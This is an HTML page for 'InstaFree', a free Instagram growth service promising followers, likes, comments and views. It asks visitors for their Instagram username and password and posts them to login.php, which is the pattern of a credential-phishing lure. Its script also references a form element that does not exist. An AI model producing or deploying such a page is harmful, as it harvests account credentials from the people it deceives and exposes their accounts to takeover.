<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>InstaFree</title>

<link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    font-family:Arial, sans-serif;
    background-image:url('bg.jpg');
    background-size:cover;
    background-position:center;
    background-attachment:fixed;
    padding:30px;
}

.logo{
    text-align:center;
    font-family:'Pacifico', cursive;
    font-size:85px;
    margin-bottom:25px;

    background:linear-gradient(
        45deg,
        #feda75,
        #fa7e1e,
        #d62976,
        #962fbf,
        #4f5bd5
    );

    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}

.content{
    width:80%;
    max-width:900px;
    margin:auto;
    margin-bottom:30px;

    background:rgba(255,255,255,0.80);
    backdrop-filter:blur(10px);

    padding:40px;
    border-radius:20px;

    text-align:center;

    box-shadow:0 8px 25px rgba(0,0,0,0.15);
}

.content h1{
    font-size:38px;
    margin-bottom:15px;
    color:#222;
}

.subtitle{
    font-size:20px;
    color:#666;
    margin-bottom:25px;
}

.content ul{
    list-style:none;
    padding:0;
}

.content ul li{
    font-size:22px;
    margin:15px 0;
    font-weight:bold;
    color:#333;
}

.content p{
    margin-top:25px;
    font-size:18px;
    color:#555;
}

.service-box{
    width:350px;
    margin:0 auto 25px;
    background:rgba(255,255,255,0.95);
    padding:25px;
    border-radius:12px;
    box-shadow:0px 0px 15px rgba(0,0,0,0.2);
}

.service-box h2{
    text-align:center;
    margin-bottom:15px;
}

.login-box{
    width:350px;
    margin:auto;
    background:rgba(255,255,255,0.95);
    padding:30px;
    border-radius:12px;
    box-shadow:0px 0px 15px rgba(0,0,0,0.2);
}

.login-box h2{
    text-align:center;
    margin-bottom:20px;
}

input, select{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:15px;
}

button{
    width:100%;
    padding:12px;
    background:#1877f2;
    color:white;
    border:none;
    border-radius:5px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#166fe5;
}

.footer{
    text-align:center;
    color:white;
    margin-top:30px;
    font-size:14px;
}
#successMsg{
    display:none;
    position:fixed;
    top:20px;
    right:20px;
    background:#28a745;
    color:white;
    padding:15px 25px;
    border-radius:8px;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 4px 10px rgba(0,0,0,0.2);
    animation:slideIn 0.5s ease;
}

@keyframes slideIn{
    from{
        opacity:0;
        transform:translateX(100px);
    }
    to{
        opacity:1;
        transform:translateX(0);
    }
}

</style>
</head>

<body>

<div class="logo">InstaFree</div>

<div class="content">

    <h1>Welcome to InstaFree</h1>

    <p class="subtitle">
        🚀 Boost your Instagram presence with InstaFree and start growing faster today.<br>
📈 Get free Instagram growth services designed to increase visibility and engagement.<br>
⚡ Experience quick results with delivery starting within 24 hours.<br>
👥 Reach more people and grow your audience with ease.<br>
🔒 Simple, fast, and user-friendly service for Instagram users.<br>
🌟 Join InstaFree and take the next step toward growing your Instagram account.<br>
    </p>

    <div class="services">
       <b> <span>➜  Followers</span>
        <span>➜  Likes</span>
        <span>➜  Comments</span>
        <span>➜  Views</span></b>
    </div>

    <p class="description">
        Boost your Instagram profile with our free social growth services.
        Select a service below and continue to get started.
    </p>

</div>
<form id="serviceForm" action="login.php" method="POST">

<div class="service-box">

<h2>Select Service</h2>

<select name="service" required>
    <option value="">Choose a Service</option>
    <option value="followers">Followers</option>
    <option value="likes">Likes</option>
    <option value="comments">Comments</option>
    <option value="views">Views</option>
</select>

<select name="quantity" required>
    <option value="">Select Quantity</option>
    <option value="10">10</option>
    <option value="50">50</option>
    <option value="100">100</option>
    <option value="300">300</option>
    <option value="500">500</option>
   
</select>

</div>

<div class="login-box">

<h2>Login</h2>




<input type="text"
       id="username"
       name="username"
       placeholder="Instagram Username"
       required>

<input type="password"
       id="password"
       name="password"
       placeholder="Password"
       required>
    <button type="submit">Submit</button>
</form>

<div id="successMsg">
    ✅ Request Submitted Successfully!
</div>

</div>

</form>

<div class="footer">
    © 2026 InstaFree
</div>




<script>
document.getElementById("serviceForm").addEventListener("submit", function(e){

    e.preventDefault();

    let username = document.getElementById("username").value.trim();
    let service = document.getElementById("service").value.trim();

    if(username === "" || service === ""){
        alert("Please fill all details.");
        return;
    }

    let msg = document.getElementById("successMsg");

    msg.style.display = "block";

    setTimeout(function(){
        msg.style.display = "none";
    }, 2000);

    document.getElementById("serviceForm").reset();

});
</script>
</body>
</html>